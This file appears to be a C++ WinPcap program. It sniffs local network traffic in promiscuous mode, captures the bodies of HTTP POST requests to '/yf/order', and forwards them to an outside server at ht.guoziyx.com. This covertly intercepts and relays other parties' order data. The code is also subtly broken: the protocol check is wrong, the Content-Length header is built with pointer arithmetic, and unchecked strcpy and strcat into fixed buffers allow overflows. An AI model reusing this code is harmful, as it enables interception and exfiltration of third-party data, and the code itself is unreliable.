// demo.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define HAVE_REMOTE
#include "pcap.h"
#include <iostream>
#include <iomanip>
#include <string>
#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#pragma comment(lib,"ws2_32.lib")
using namespace std;


/*Ethernet Heder*/
struct ether_header
{
	u_int8_t  ether_dhost[6];      /* destination eth addr */
	u_int8_t  ether_shost[6];      /* source ether addr    */
	u_int16_t ether_type;          /* packet type ID field */
};


/* 4 bytes IP address */
struct ip_address{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
};

/* IPv4 header */
 struct ip_header{
	u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
	u_char  tos;            // Type of service 
	u_short tlen;           // Total length 
	u_short identification; // Identification
	u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
	u_char  ttl;            // Time to live
	u_char  proto;          // Protocol
	u_short crc;            // Header checksum
	ip_address  saddr;      // Source address
	ip_address  daddr;      // Destination address
	u_int   op_pad;         // Option + Padding
};

/* UDP header*/
 struct udp_header{
	u_short sport;          // Source port
	u_short dport;          // Destination port
	u_short len;            // Datagram length
	u_short crc;            // Checksum
};

/*TCP Header*/
struct tcp_header
  {
    u_int16_t th_sport;         /* source port */
    u_int16_t th_dport;         /* destination port */
    u_int32_t th_seq;             /* sequence number */
    u_int32_t th_ack;             /* acknowledgement number */
	u_int16_t th_len_resv_code;	 //   Datagram   length and reserved code
    u_int16_t th_win;           /* window */
    u_int16_t th_sum;           /* checksum */
    u_int16_t th_urp;           /* urgent pointer */
};

/*
 * check whether a char is readable
 */
bool is_readable(char c){	
	return isalnum(c) || ispunct(c) || isspace(c) || isprint(c);
}


int mysubstr(const char *str, const char* str0, char str1[])
{
    str1[0] = 0;
    char* strp = strstr(str, str0);
    if (strp == NULL)
    {
        return 0;
    }
    strcpy(str1, strp + strlen(str0));
	return 0;
}

/*
 * This demo show how to use winpcap sdk to capture the http request/respone, then print the readable content.
 * Note: in Visual Studio 2005,it should set the "project->config->c/c++->language->default unsigned char" to yes(/J) 
 *       to stop the assution.
 */
void main(int argc,char* argv[]){
	
	//retrieve the devices list
	pcap_if_t *all_devs;
	char err_buff[PCAP_ERRBUF_SIZE];
	if(pcap_findalldevs_ex(PCAP_SRC_IF_STRING,NULL,&all_devs, err_buff)==-1){
		cerr<<"Error in pcap_findalldevs_ex "<<err_buff<<endl;
		return;
	}

	//get the device index,default is the first one
	int dev_idx = 4;
	if(argc == 2){
		dev_idx = atoi(argv[1]);
	}
	pcap_if_t *dev=all_devs;
	for(int i=0;i<dev_idx;++i,dev=dev->next);//jump to the device of the specified index
	cout<<"Listen on: "<<dev->name<<endl;
	cout<<"****************************************"<<endl;
	//get the netcard adapter
	pcap_t *adpt_hdl = pcap_open(dev->name,65536,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,err_buff);
	if(adpt_hdl==NULL){
		cerr<<"Unable to open adapter "<<dev->name<<endl;
		pcap_freealldevs(all_devs);
		return;
	}
	/* At this point, we don't need any more the device list. Free it */
	pcap_freealldevs(all_devs);

	//analyze each packet
	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	int rst=0;
	while((rst=pcap_next_ex(adpt_hdl,&header,&pkt_data))>=0){
		if(rst==0){
			//time out and not packet captured
			continue;
		}
		
		ether_header *eh = (ether_header*)pkt_data;
		if(ntohs(eh->ether_type)==0x0800){ // ip packet only
			ip_header *ih = (ip_header*)(pkt_data+14);
			
			if(ntohs(ih->proto) == 0x600){ // tcp packet only
				int ip_len = ntohs(ih->tlen);//ip_len = ip_body + ip_header
				bool find_http = false;
				string http_txt = "";

				char* ip_pkt_data = (char*)ih;
				for(int i=0;i<ip_len;++i){
					
					//check the http request
					//if(!find_http && (i+3<ip_len && strncmp(ip_pkt_data+i,"GET ",strlen("GET ")) ==0 ) 
					   //|| (i+4<ip_len && strncmp(ip_pkt_data+i,"POST ",strlen("POST ")) == 0) ){
						//find_http = true;
					//}

                    //check the post request(截取了post 到/yf/order地址的数据)
					if(!find_http && (i+4<ip_len && strncmp(ip_pkt_data+i,"POST /yf/order",strlen("POST /yf/order")) == 0) ){
						find_http = true;
					}

					//check the http response
					//if(!find_http && i+8<ip_len && strncmp(ip_pkt_data+i,"HTTP/1.1 ",strlen("HTTP/1.1 "))==0){
						//find_http = true;
					//}

					//collect the http text
					if(find_http && is_readable(ip_pkt_data[i])){
						//只获取
						http_txt += ip_pkt_data[i];
					}

				}

				//print the http request
				if(http_txt != ""){
					//只抓取发送到47.107.250.117的数据
					cout<<http_txt;
					const char* p = http_txt.data();
					char data[1024];
					mysubstr(p, "\r\n\r\n", data);
					cout<<"\r\n data:"<<endl;
					cout<<data<<endl;
					cout<<endl<<"***********************************************************"<<endl<<endl;
					//转发
					int num;
					SOCKET s;
					WSADATA wsa;
					struct sockaddr_in serv;
 
					char sndBuf[1024], rcvBuf[2048];
 
					WSAStartup(MAKEWORD(2, 1), &wsa);
 
 
					if ((s = socket(AF_INET, SOCK_STREAM, 0))<0)
					{
						perror("socket error!");
						
					}
 
					memset(&serv,0,sizeof(serv));
					serv.sin_family = AF_INET;
					serv.sin_port = htons(80);
					serv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
 
					if ((connect(s, (struct sockaddr *)&serv, sizeof(serv)))<0)
					{
						perror("connet error!");
					
					}
 
					memset(sndBuf, 0, 1024);
					memset(rcvBuf, 0, 2048);
 
					//头信息
					strcat(sndBuf, "POST http://ht.guoziyx.com/http.php HTTP/1.1\r\n");
					strcat(sndBuf, "Accept: */*\r\n");
					strcat(sndBuf, "Accept-Language: zh-cn\r\n");
					strcat(sndBuf, "Content-Type: application/x-www-form-urlencoded\r\n");
					strcat(sndBuf, "User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\n");
					strcat(sndBuf, "Host: guoziyx.com\r\n");
					strcat(sndBuf, "Content-Length: "+sizeof(data));
					strcat(sndBuf, "\r\n");
					strcat(sndBuf, "Cache-Control: no-cache\r\n");

					strcat(sndBuf, "\r\n");
					
 					strcat(sndBuf, data);

					puts(sndBuf);
  
					if ((num = send(s,sndBuf,1024, 0))<0)
				   {
						perror("send error!");
					
					}
					
					puts("send success!\n");
 
 
					closesocket(s);
					
					perror("pause");
					WSACleanup();
				}
			}
		}
	}
}

